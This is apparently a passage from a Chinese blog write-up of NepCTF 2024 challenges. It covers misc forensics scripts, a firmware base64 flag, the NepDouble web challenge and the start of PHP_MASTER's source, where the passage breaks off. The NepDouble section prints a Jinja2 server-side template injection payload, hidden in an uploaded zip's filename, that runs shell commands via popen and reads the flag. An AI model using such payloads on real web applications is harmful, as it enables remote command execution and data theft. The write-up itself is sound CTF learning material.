again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;SunR&quot;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eren&quot;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像对了！可以先去试试！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&quot;</span>)<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># 补全</span><br>flag = <span class="hljs-string">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><br><span class="hljs-comment"># 将字符串转换为列表</span><br>flag_list = <span class="hljs-built_in">list</span>(flag)<br>flag_list[<span class="hljs-number">0</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">83</span>).lower()<br><br>flag_list[-<span class="hljs-number">3</span>:] = <span class="hljs-string">&quot;ve&#125;&quot;</span><br><span class="hljs-comment"># base64解密带入</span><br>base64_code = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&quot;RnJpSGlt&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>flag_list[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>] = base64_code[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>flag_list[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>] = base64_code[<span class="hljs-number">3</span>:]<br><span class="hljs-comment"># 简单数学计算答案15</span><br>flag_list[<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;1&quot;</span><br>flag_list[<span class="hljs-number">25</span>] = <span class="hljs-string">&quot;5&quot;</span><br><span class="hljs-comment"># 计算带入</span><br>number = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-number">1028970</span>/<span class="hljs-number">927</span>))<br>flag_list[<span class="hljs-number">33</span>] = number[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">41</span>] = number[<span class="hljs-number">1</span>]<br>flag_list[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>] = number[<span class="hljs-number">2</span>:]<br><br>str1 = <span class="hljs-string">&quot;1t1rna&quot;</span>.replace(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>)<br>flag_list[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>] = str1<br><span class="hljs-comment"># 转化大小写</span><br>flag_list[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>] = <span class="hljs-string">&quot;me&quot;</span><br><span class="hljs-comment"># 进行分割</span><br>flag_list[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">19</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">34</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">42</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br>flag_list[<span class="hljs-number">27</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br><br>flag_list[<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).lower()<br><br>flag_list[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]<br><br>flag_list[<span class="hljs-number">7</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;j&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">8</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;t&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">9</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;|&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">18</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;D&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">26</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>) - <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 前面的是芙莉莲后面的是辛美尔</span><br>flag_list[<span class="hljs-number">13</span>:<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;eren&quot;</span><br>flag_list[<span class="hljs-number">20</span>:<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;SunR&quot;</span><br><span class="hljs-comment"># 猜测是单词secret</span><br>flag_list[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;r&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag_list)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到**secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}**解压得到图片，010分析之后可能需要异或得到原来的图片(第一次见,涨知识了)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;miaomiao.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>key = <span class="hljs-string">b&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    data = enc[i]^key[i%<span class="hljs-built_in">len</span>(key)]<br>    flag.append(data)<br><br>flag = <span class="hljs-built_in">bytes</span>(flag)<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(flag)<br></code></pre></td></tr></table></figure><p>没有直接的flag，crc爆破一下得到flag</p><p><img src="/../../images/nepctf/2024/flag.png" alt="flag"></p><h2 id="nepmagic-checkin"><a class="markdownIt-Anchor" href="#nepmagic-checkin"></a> NepMagic —— CheckIn</h2><p>游戏签到，有一层需要盲走得到隐藏的碎片，走完就可以得到flag了</p><p><img src="/../../images/nepctf/2024/checkin.png" alt="checkin"></p><h2 id="3dnep"><a class="markdownIt-Anchor" href="#3dnep"></a> 3DNep</h2><p>也是第一次见，010打开开头是gitf，搜索一下是3d模型的图片，改一下.gitf，用该网站看一下<a href="https://gltf-viewer.donmccurdy.com/">在线网址</a></p><img src="/../../images/nepctf/2024/hanxin.png" alt="hanxin" style="zoom:67%;"><p>可以得到图片，遇到的二维码是汉信码也是第一次见，用在线网站扫一下，得到flag</p><p>NepCTF{6e766b59-23d1-395c26d708a4}</p><h2 id="nepcamera"><a class="markdownIt-Anchor" href="#nepcamera"></a> NepCamera</h2><p>跟着官方wp也是学一遍，也是第一次见usb类型的流量包，根据官p和晨曦师傅的wp研究了一下，先看一下usb里面的流量包里面会发现有<code>ffd8ffe0</code>的内容，利用tshark先把内容提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>然后就是写脚本提取内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">datas = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../test&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read().strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>hex_data = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:<br>    data = i.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    hex_data += <span class="hljs-string">&#x27;&#x27;</span>.join([d[<span class="hljs-number">24</span>:] <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_data))<br>cnt = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    start = hex_data.find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> start == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    end = hex_data[start+<span class="hljs-number">8</span>:].find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> end == -<span class="hljs-number">1</span>:<br>        end = <span class="hljs-built_in">len</span>(hex_data)<br>    out_data = hex_data[start:end]<br>    hex_data = hex_data[end:]<br>    out_data = <span class="hljs-built_in">bytes</span>.fromhex(out_data)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./img/&#x27;</span>+<span class="hljs-built_in">str</span>(cnt)+<span class="hljs-string">&#x27;.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(out_data)<br>    cnt += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(cnt)<br></code></pre></td></tr></table></figure><p>对图片进行分析一会就可以得到flag了</p><h1 id="hardware"><a class="markdownIt-Anchor" href="#hardware"></a> Hardware</h1><p>进行binwalk一下得到许多文件</p><p>再进行string 分析通过排除可以得到在string 19047F里面有</p><p>猜一手base64然后就可以搜<code>=</code>有一串长的内容，利用cyber厨子得到flag</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">JZSXAQ2UIZ5VSMDVL5DTA5C7JMZTG3S7GFXFGMLHNB2F6MLOL53FQ5ZQOJFXGIJBEFPUYM3UE5ZV6RZQL5DHK4TUNAZXE7I=<br></code></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t’s_G0_Furth3r}</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="nepdouble"><a class="markdownIt-Anchor" href="#nepdouble"></a> NepDouble</h2><p>这题其实已经有思路了，就是利用上传文件进行ssti，但是自己代码没有好好看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> zipfile <span class="hljs-keyword">import</span> ZipFile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader<br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;static&#x27;</span>)<br>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;/app/uploads&#x27;</span><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):<br>    os.makedirs(UPLOAD_FOLDER)<br><br>template_env = Environment(loader=FileSystemLoader(<span class="hljs-string">&#x27;static&#x27;</span>), autoescape=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-params">template_name, **context</span>):<br>    template = template_env.get_template(template_name)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template_string</span>(<span class="hljs-params">template_string, **context</span>):<br>    template = template_env.from_string(template_string)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please use POST method to upload files.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        clear_uploads_folder()<br>        files = request.files.get(<span class="hljs-string">&#x27;tp_file&#x27;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span><br><br>        file_size = <span class="hljs-built_in">len</span>(files.read())<br>        files.seek(<span class="hljs-number">0</span>)<br><br>        file_extension = files.filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].lower()<br>        <span class="hljs-keyword">if</span> file_extension != <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span><br><br>        timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d%H%M%S&#x27;</span>)<br>        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()<br>        unzip_folder = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)<br>        os.makedirs(unzip_folder, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">with</span> ZipFile(files) <span class="hljs-keyword">as</span> zip_file:<br>            zip_file.extractall(path=unzip_folder)<br><br>        files_list = []<br>        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):<br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>                <span class="hljs-built_in">print</span>(file)<br>                file_path = os.path.join(root, file)<br>                relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])<br>                link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span><br>                files_list.append(link)<br><br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))<br><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid filename.&#x27;</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An error occurred. Please check your file and try again.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/cat&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    file_path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File path is missing.&#x27;</span><br><br>    new_file = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)<br>    <span class="hljs-keyword">if</span> os.path.commonprefix(<br>            [os.path.abspath(new_file), os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(<br>            app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file path.&#x27;</span><br><br>    <span class="hljs-keyword">if</span> os.path.islink(new_file):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        filename = file_path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        content = read_large_file(new_file)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;test.html&#x27;</span>, content=content, filename=filename, dates=Exec_date())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found.&#x27;</span><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error reading file: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec_date</span>():<br>    d_res = os.popen(<span class="hljs-string">&#x27;date&#x27;</span>).read()<br>    <span class="hljs-keyword">return</span> d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].strip() + <span class="hljs-string">&quot; &quot;</span> + d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">3</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_uploads_folder</span>():<br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>            os.remove(os.path.join(root, file))<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>            os.rmdir(os.path.join(root, <span class="hljs-built_in">dir</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">file_path</span>):<br>    content = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            content += line<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-string">&quot;8000&quot;</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>关键点在<code> return render_template_string('&lt;br&gt;'.join(files_list))</code></p><p>再看一下static可以进行ssti</p><p>直接命名文件名</p><p><code>&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p><p>通过修改<code>ls</code>这个位置，发现flag在上个目录，需要进行<code>cd..;cat flag</code>然后写个exp传入得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;https://neptune-16431.nepctf.lemonprefect.cn/&#x27;</span><br><span class="hljs-comment"># 上传带有恶意脚本的文件名</span><br>files = &#123;<span class="hljs-string">&quot;tp_file&quot;</span>:(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read())&#125;<br>response = requests.post(url, files=files)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="php_master"><a class="markdownIt-Anchor" href="#php_master"></a> PHP_MASTER!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span 